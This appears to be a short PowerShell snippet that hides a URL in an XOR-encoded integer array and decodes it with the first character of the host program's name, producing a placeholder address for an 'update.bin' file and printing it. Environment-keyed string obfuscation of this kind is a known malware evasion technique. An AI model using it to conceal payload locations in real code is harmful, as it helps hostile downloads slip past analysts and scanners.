$hostName = $Host.Name
$url = ((43,55,55,51,48,121,108,108,38,59,34,46,51,47,38,109,44,49,36,108,34,51,42,108,53,114,108,54,51,39,34,55,38,109,33,42,45 | ForEach-Object { [char]($_ -bxor [int]([char]$hostName[0])) }) -join '')
Write-Output $url
